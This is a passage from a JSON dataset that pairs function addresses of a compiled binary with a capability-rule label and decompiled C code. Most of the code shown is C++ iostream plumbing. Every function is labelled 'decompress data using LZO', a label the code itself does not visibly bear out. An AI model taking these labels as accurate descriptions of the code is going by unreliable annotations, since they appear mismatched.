        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047fa90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 0x10);\n        if ((var_34h & var_38h) == 0xffffffff) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "0047fbb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0047fbb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    if ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 0x10);\n        if ((var_24h & var_28h) == 0xffffffff) {\n            fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0047fd90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047fd90(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0047fec0();\n    if (var_10h != '\\0') {\n        iVar3 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x30))(arg_8h, arg_ch);\n        if (arg_ch != iVar3) {\n            fcn.0049ce20();\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.0049e8f0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.0049ce20(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0047fec0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0047fec0(uchar *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack24;\n    uint uStack20;\n    \n    *param_1 = 0;\n    iVar1 = *param_2;\n    *(param_1 + 4) = param_2;\n    uVar3 = *(iVar1 + -0xc) + param_2;\n    uVar5 = *(uVar3 + 0x14);\n    if (*(uVar3 + 0x70) != 0) {\n        if (uVar5 != 0) goto code_r0x0047fee8;\n        fcn.0047f9e0();\n        uVar3 = param_2 + *(*param_2 + -0xc);\n        uVar5 = *(uVar3 + 0x14);\n    }\n    if (uVar5 == 0) {\n        *param_1 = 1;\n        return uVar3;\n    }\ncode_r0x0047fee8:\n    uVar4 = uVar5 | 4;\n    if (*(uVar3 + 0x78) == 0) {\n        uVar4 = uVar5 | 5;\n    }\n    *(uVar3 + 0x14) = uVar4;\n    if ((*(uVar3 + 0x10) & uVar4) == 0) {\n        return uVar4;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    fcn.0048f500(iStack24 + 0x6c);\n    fcn.0049ab80(iStack24, uStack20);\n    fcn.0048f620();\n    fcn.0049cbb0(uStack20);\n    piVar2 = *(iStack24 + 0x78);\n    if (piVar2 != NULL) {\n        fcn.0048f500(piVar2 + 7);\n        (**(*piVar2 + 8))(uStack20);\n        fcn.0048f670(uStack20);\n        fcn.0048f620();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 524
    },
    "00480090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00480090(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x00480129;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.0049e780();\ncode_r0x004801b0:\n        uVar5 = fcn.0049e780();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004a36d0(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar6 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x004801b0;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x24))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x00480129:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 921
    },
    "00480230": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00480230(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    ushort uVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x004802da;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x00480360:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x00480360;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 8))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x004802da:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 923
    },
    "004803e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004803e0(int32_t *param_1, ulong param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    ushort uVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0(param_1);\n    if (var_20h == '\\0') goto code_r0x0048047a;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.0049e780();\ncode_r0x00480500:\n        uVar6 = fcn.0049e780();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            fcn.0041b360(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004a36d0(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x00480500;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar7 = *param_1;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x1c))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x0048047a:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 912
    },
    "00480580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.00480580(int32_t *param_1, unkbyte10 param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    ushort uVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0(param_1);\n    if (var_20h == '\\0') goto code_r0x00480614;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.0049e780();\ncode_r0x004806a0:\n        uVar6 = fcn.0049e780();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            fcn.0041b360(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004a36d0(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x76) == '\\0') {\n            if (*(iVar5 + 0x7c) == NULL) goto code_r0x004806a0;\n            uVar4 = (**(**(iVar5 + 0x7c) + 0x28))(0x20);\n            iVar7 = *param_1;\n            *(iVar5 + 0x74) = uVar4;\n            *(iVar5 + 0x76) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            uVar4 = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x20))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, uVar4, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x00480614:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 912
    },
    "00480720": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00480720(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x004807b9;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.0049e780();\ncode_r0x00480840:\n        uVar5 = fcn.0049e780();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004a36d0(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar6 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x00480840;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0xc))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x004807b9:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 920
    },
    "004808c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004808c0(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    uint var_2eh;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x00480959;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.0049e780();\ncode_r0x004809e0:\n        uVar5 = fcn.0049e780();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004a36d0(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar6 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x004809e0;\n            var_2eh._0_2_ = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_2eh;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_2eh._0_2_ = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x10))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_2eh, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x00480959:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 922
    },
    "00480a60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00480a60(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    ushort var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x00480b16;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.0049e780();\ncode_r0x00480ba0:\n        uVar5 = fcn.0049e780();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004a36d0(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar6 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x00480ba0;\n            var_3ah = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_3ah;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_3ah = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x14))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_3ah, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x00480b16:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 949
    },
    "00480c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00480c20(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar4;\n    ulong uVar5;\n    int32_t *piVar6;\n    ushort var_3ah;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0();\n    if (var_20h == '\\0') goto code_r0x00480cd6;\n    iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    piVar6 = *(iVar4 + 0x80);\n    if (piVar6 == NULL) {\n        fcn.0049e780();\ncode_r0x00480d60:\n        uVar5 = fcn.0049e780();\n        piVar6 = uVar5;\n        if (uVar5 >> 0x20 == 1) {\n            fcn.004a36d0(piVar6);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0047ff80();\n            piVar6 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar6);\n        iVar4 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar4 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar4 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar4 + 0x76) == '\\0') {\n            if (*(iVar4 + 0x7c) == NULL) goto code_r0x00480d60;\n            var_3ah = (**(**(iVar4 + 0x7c) + 0x28))(0x20);\n            iVar2 = *in_ECX;\n            *(iVar4 + 0x74) = var_3ah;\n            *(iVar4 + 0x76) = 1;\n            iVar4 = *(iVar2 + -0xc) + in_ECX;\n        }\n        else {\n            var_3ah = *(iVar4 + 0x74);\n        }\n        (**(*piVar6 + 0x18))(*(iVar4 + 0x78), *(iVar4 + 0x78) == 0, iVar4, var_3ah, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.0049ce20();\n        }\n    }\ncode_r0x00480cd6:\n    iVar4 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar3 = fcn.0049e8f0();\n        if ((cVar3 == '\\0') && (piVar6 = *(var_1ch + iVar4 + 0x78),  piVar6 != NULL)) {\n            iVar4 = (**(*piVar6 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 949
    },
    "00480de0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00480de0(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50aaac;\n    *(in_ECX + 0x1e) = 0;\n    iVar3 = *arg_8h;\n    in_ECX[0x1d] = 0;\n    iVar3 = arg_8h + *(iVar3 + -0xc);\n    *(in_ECX + 0x7a) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[1] = 0x50aac0;\n    fcn.0049ac60(iVar3);\n    fcn.0049cbb0(in_ECX + 0x1c);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x1d] = uVar2;\n    *(in_ECX + 0x1e) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x7a) = uVar1;\n    return;\n}\n",
        "token_count": 375
    },
    "00480eb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
